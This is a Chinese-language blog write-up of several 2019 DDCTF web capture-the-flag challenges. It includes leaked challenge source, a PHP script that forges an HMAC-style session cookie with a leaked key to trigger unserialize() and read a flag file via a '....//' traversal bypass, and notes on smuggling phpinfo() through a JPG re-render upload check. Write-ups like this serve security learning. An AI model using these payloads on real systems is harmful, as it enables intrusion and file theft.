---
title: 2019 DDCTF Web Writeup
tags:
  - Writeup
abstract: 待补充
top: 0
date: 2019-04-19 22:47:31
---

题目地址，据说滴滴还会开放半年。

<https://ddctf.didichuxing.com/challenges>



## 滴~

![](http://ww1.sinaimg.cn/large/de75fd55gy1g2mtgfylgej20kx04adg3.jpg)

一上来就心情复杂，没想到真他妈复杂，脑洞题。

URL 看起来会有文件包含，经过尝试后发现：两次 `base64`，一次 `hex` 编码。

![](http://ww1.sinaimg.cn/large/de75fd55gy1g2mtjsy907j20900hat8r.jpg)

那试试能不能读个 `index.php` ，按照上面的规则编码为 `TmprMlpUWTBOalUzT0RKbE56QTJPRGN3`。

![](http://ww1.sinaimg.cn/large/de75fd55gy1g2mtlrzpzbj20zg045gmd.jpg)

读取成功，解码一下：

```php
<?php
/*
 * https://blog.csdn.net/FengBanLiuYun/article/details/80616607
 * Date: July 4,2018
 */
error_reporting(E_ALL || ~E_NOTICE);

header('content-type:text/html;charset=utf-8');
if(! isset($_GET['jpg']))
    header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');
$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));
echo '<title>'.$_GET['jpg'].'</title>';
$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
echo $file.'</br>';
$file = str_replace("config","!", $file);
echo $file.'</br>';
$txt = base64_encode(file_get_contents($file));

echo "<img src='data:image/gif;base64,".$txt."'></img>";
/*
 * Can you find the flag file?
 */

?>
```

感觉可以作为 `ssrf` 打，可惜 `config.php` 绕半天绕不过，! 没有实际意义，不好结合。

然而，给的一个博客链接有点莫名其妙，是关于 `echo` 的用法，并没找到有价值的线索。

偶然发现了此题的前身，<http://www.atomsec.org/ctf/bctf-web-code-考脑洞，你能过么？/>。

按照上面那题打法，应该是找个直接能读的文件，得到源码继续做。既然出题人给了这么个链接，那就继续找呗。

<https://blog.csdn.net/fengbanliuyun/article/details/80913909> 下面的评论喜人。

最终尝试出这么个文件——`practice.txt.swp`。（ `.` 都不需要哦，惊不惊喜，意不意外 ：）

```php
// f1ag!ddctf.php
<?php
include('config.php');
$k = 'hello';
extract($_GET);
if(isset($uid)) {
    $content=trim(file_get_contents($k));
    if($uid==$content)
		echo $flag;
	else
		echo'hello';
}
```

然后就是基本功了，变量覆盖。

## WEB 签到题

> 抱歉，您没有登陆权限，请获取权限后访问-----

查看源码，发现了 `index.js`。

![](http://ww1.sinaimg.cn/large/de75fd55gy1g2mu2nwd7oj20l50hkgn1.jpg)

传个 `admin` 进去，就可以看到提示信息了，<http://117.51.158.44/app/fL2XID2i0Cdh.php>。

可以看到两份源码

```php
// app/Application.php
<?php
class Application {
    public $path = '';

    public function response($data, $errMsg = 'success') {
        $ret = ['errMsg' => $errMsg,
            'data' => $data];
        $ret = json_encode($ret);
        header('Content-type: application/json');
        echo $ret;
    }

    public function auth() {
        $DIDICTF_ADMIN = 'admin';
        if (!empty($_SERVER['HTTP_DIDICTF_USERNAME']) && $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) {
            $this->response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php');
            return true;
        } else {
            $this->response('抱歉，您没有登陆权限，请获取权限后访问-----', 'error');
            exit();
        }
    }

    private function sanitizepath($path) {
        $path = trim($path);
        $path=str_replace('../', '', $path);
        $path=str_replace('..\\', '', $path);
        return $path;
    }

    public function __destruct() {
        if (empty($this->path)) {
            exit();
        } else {
            $path = $this->sanitizepath($this->path);
            if (strlen($path) !== 18) {
                exit();
            }
            // 反序列点
            $this->response($data=file_get_contents($path), 'Congratulations');
        }
        exit();
    }
}


// url:app/Session.php

include 'Application.php';
class Session extends Application {
    //key建议为8位字符串
    public $eancrykey           = 'EzblrbNS';
    public $cookie_expiration   = 7200;
    public $cookie_name         = 'ddctf_id';
    public $cookie_path			= '';
    public $cookie_domain		= '';
    public $cookie_secure		= false;
    public $activity            = "DiDiCTF";


    public function index() {
        if (parent::auth()) {
            $this->get_key();
            if ($this->session_read()) {
                $data = 'DiDI Welcome you %s';
                $data = sprintf($data, $_SERVER['HTTP_USER_AGENT']);
                parent::response($data, 'sucess');
            } else {
                $this->session_create();
                $data = 'DiDI Welcome you';
                parent::response($data, 'sucess');
            }
        }
    }

    private function get_key() {
        //eancrykey and flag under the folder
        $this->eancrykey =  file_get_contents('../config/key.txt');
    }

    public function session_read() {
        if (empty($_COOKIE)) {
            return false;
        }

        // ddctf_id 的值
        $session = $_COOKIE[$this->cookie_name];

        if (!isset($session)) {
            parent::response("session not found", 'error');
            return false;
        }

        $hash = substr($session, strlen($session)-32);
        $session = substr($session, 0, strlen($session)-32);

        // 检测密钥是否一致
        if ($hash !== md5($this->eancrykey . $session)) {
            parent::response("the cookie data not match", 'error');
            return false;
        }

        // 反序列化
        $session = unserialize($session);

        if (!is_array($session) or !isset($session['session_id']) or !isset($session['ip_address']) or !isset($session['user_agent'])) {
            return false;
        }

        // 构造 nickname = test%s，key 搞到手 => EzblrbNS
        if (!empty($_POST["nickname"])) {
            $arr = array($_POST["nickname"], $this->eancrykey);
            $data = "Welcome my friend %s";
            foreach ($arr as $k => $v) {
                $data = sprintf($data, $v);
            }
            parent::response($data, "Welcome");
        }

        // ip 和 ua 要一致，remote_addr 可控？
        if ($session['ip_address'] != $_SERVER['REMOTE_ADDR']) {
            parent::response('the ip addree not match'.'error');
            return false;
        }
        if ($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) {
            parent::response('the user agent not match', 'error');
            return false;
        }
        return true;
    }

    private function session_create() {
        $sessionid = '';
        while (strlen($sessionid) < 32) {
            $sessionid .= mt_rand(0, mt_getrandmax());
        }

        $userdata = array(
            'session_id' => md5(uniqid($sessionid, true)),
            'ip_address' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
            'user_data' => 'O%3A11%3A%22Application%22%3A1%3A%7Bs%3A4%3A%22path%22%3Bs%3A21%3A%22....%2F%2Fconfig%2Fflag.txt%22%3B%7D'
        );

        $cookiedata = serialize($userdata);
        $cookiedata = $cookiedata . md5($this->eancrykey.$cookiedata);
        $expire = $this->cookie_expiration + time();
        setcookie(
            $this->cookie_name,
            $cookiedata,
            $expire,
            $this->cookie_path,
            $this->cookie_domain,
            $this->cookie_secure
        );
    }
}


$ddctf = new Session();
$ddctf->index();
```

反序列点比较明显，直接给 `payload` 吧。

```php
<?php
class Application {
    public $path = '....//config/flag.txt';
}

//echo urlencode(serialize(new Application));

$key = 'EzblrbNS';
$userdata = array(
    'session_id' => "a11e3c4b0327d47158328ef05bb3c236",
    'ip_address' => "220.160.83.57",
    'user_agent' => "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
    'user_data' => new Application
);

$cookiedata = serialize($userdata);
$cookiedata = $cookiedata . md5($key . $cookiedata);
echo urlencode($cookiedata);

/*
class Application {
    public $path = '';
    private function sanitizepath($path) {
        $path = trim($path);
        $path=str_replace('../', '', $path);
        $path=str_replace('..\\', '', $path);
        return $path;
    }

    public function __destruct() {
        if (empty($this->path)) {
            exit();
        } else {
            $path = $this->sanitizepath($this->path);
            if (strlen($path) !== 18) {
                echo "error";
                exit();
            }
            // 反序列点
            echo $path;
            echo file_get_contents($path);
        }
        exit();
    }
}
*/

$test = unserialize($cookiedata);
print_r($test);

$data = 'O:11:"Application":1:{s:4:"path";s:21:"....//config/flag.txt";}';
print_r(unserialize($data));
```



## Upload-IMG

直接给的一个上传文件的窗口，不愧是上传题，简单明了。

随手传个图片上去看看

![](http://ww1.sinaimg.cn/large/de75fd55gy1g2muauq80kj20ga0ao40x.jpg)

下载下来后，发现转码了，猜测是二次渲染，可参考 `upload-labs` 第 16 关。

先将 `jpg` 图片上传然后下载，利用 `jpg_payload` 脚本插入 `phpinfo()` 再进行上传，前期用小图片做试验发现会有部分的内容缺失，最后用一张 400 KB 的 `jpg` 图片成功了。后来发现官方修改了题目，限制了上传图片的大小，难道是非预期吗，xswl。

还有种办法，利用上面的脚本一次多插几个 `phpinfo` 就可以了。

脚本及有关分析参考 <https://xz.aliyun.com/t/2657>



## homebrew event loop

> 这题目非常有意思

```python
# -*- encoding: utf-8 -*- 
# written in python 2.7 
__author__ = 'garzon' 

from flask import Flask, session, request, Response 
import urllib 

app = Flask(__name__) 
app.secret_key = '*********************' # censored 
url_prefix = '/d5afe1f66747e857' 

def FLAG(): 
    return 'FLAG_is_here_but_i_wont_show_you'  # censored 
     
def trigger_event(event): 
    session['log'].append(event) 
    if len(session['log']) > 5: session['log'] = session['log'][-5:] 
    if type(event) == type([]): 
        request.event_queue += event 
    else: 
        request.event_queue.append(event) 

def get_mid_str(haystack, prefix, postfix=None): 
    haystack = haystack[haystack.find(prefix)+len(prefix):] 
    if postfix is not None: 
        haystack = haystack[:haystack.find(postfix)] 
    return haystack 
     
class RollBackException: pass 

def execute_event_loop(): 
    valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#') 
    resp = None 
    while len(request.event_queue) > 0: 
        event = request.event_queue[0] # `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......" 
        request.event_queue = request.event_queue[1:] 
        if not event.startswith(('action:', 'func:')): continue 
        for c in event: 
            if c not in valid_event_chars: break 
        else: 
            is_action = event[0] == 'a' 
            action = get_mid_str(event, ':', ';') 
            args = get_mid_str(event, action+';').split('#') 
            try: 
                event_handler = eval(action + ('_handler' if is_action else '_function')) 
                ret_val = event_handler(args) 
            except RollBackException: 
                if resp is None: resp = '' 
                resp += 'ERROR! All transactions have been cancelled. <br />' 
                resp += '<a href="./?action:view;index">Go back to index.html</a><br />' 
                session['num_items'] = request.prev_session['num_items'] 
                session['points'] = request.prev_session['points'] 
                break 
            except Exception, e: 
                if resp is None: resp = '' 
                #resp += str(e) # only for debugging 
                continue 
            if ret_val is not None: 
                if resp is None: resp = ret_val 
                else: resp += ret_val 
    if resp is None or resp == '': resp = ('404 NOT FOUND', 404) 
    session.modified = True 
    return resp 
     
@app.route(url_prefix+'/') 
def entry_point(): 
    querystring = urllib.unquote(request.query_string) 
    request.event_queue = [] 
    if querystring == '' or (not querystring.startswith('action:')) or len(querystring) > 100: 
        querystring = 'action:index;False#False' 
    if 'num_items' not in session: 
        session['num_items'] = 0 
        session['points'] = 3 
        session['log'] = [] 
    request.prev_session = dict(session) 
    trigger_event(querystring) 
    return execute_event_loop() 

# handlers/functions below -------------------------------------- 

def view_handler(args): 
    page = args[0] 
    html = '' 
    html += '[INFO] you have {} diamonds, {} points now.<br />'.format(session['num_items'], session['points']) 
    if page == 'index': 
        html += '<a href="./?action:index;True%23False">View source code</a><br />' 
        html += '<a href="./?action:view;shop">Go to e-shop</a><br />' 
        html += '<a href="./?action:view;reset">Reset</a><br />' 
    elif page == 'shop': 
        html += '<a href="./?action:buy;1">Buy a diamond (1 point)</a><br />' 
    elif page == 'reset': 
        del session['num_items'] 
        html += 'Session reset.<br />' 
    html += '<a href="./?action:view;index">Go back to index.html</a><br />' 
    return html 

def index_handler(args): 
    bool_show_source = str(args[0]) 
    bool_download_source = str(args[1]) 
    if bool_show_source == 'True': 
     
        source = open('eventLoop.py', 'r') 
        html = '' 
        if bool_download_source != 'True': 
            html += '<a href="./?action:index;True%23True">Download this .py file</a><br />' 
            html += '<a href="./?action:view;index">Go back to index.html</a><br />' 
             
        for line in source: 
            if bool_download_source != 'True': 
                html += line.replace('&','&amp;').replace('\t', '&nbsp;'*4).replace(' ','&nbsp;').replace('<', '&lt;').replace('>','&gt;').replace('\n', '<br />') 
            else: 
                html += line 
        source.close() 
         
        if bool_download_source == 'True': 
            headers = {} 
            headers['Content-Type'] = 'text/plain' 
            headers['Content-Disposition'] = 'attachment; filename=serve.py' 
            return Response(html, headers=headers) 
        else: 
            return html 
    else: 
        trigger_event('action:view;index') 
         
def buy_handler(args): 
    num_items = int(args[0]) 
    if num_items <= 0: return 'invalid number({}) of diamonds to buy<br />'.format(args[0]) 
    session['num_items'] += num_items  
    trigger_event(['func:consume_point;{}'.format(num_items), 'action:view;index']) 
     
def consume_point_function(args): 
    point_to_consume = int(args[0]) 
    if session['points'] < point_to_consume: raise RollBackException() 
    session['points'] -= point_to_consume 
     
def show_flag_function(args): 
    flag = args[0] 
    #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. 
    return 'You naughty boy! ;) <br />' 
     
def get_flag_handler(args): 
    if session['num_items'] >= 5: 
        trigger_event('func:show_flag;' + FLAG()) # show_flag_function has been disabled, no worries 
    trigger_event('action:view;index') 
     
if __name__ == '__main__': 
    app.run(debug=False, host='0.0.0.0') 
```



## 欢迎报名 DDCTF



## 大吉大利，今晚吃鸡~



## mysql 弱口令



## 再来 1 杯 Java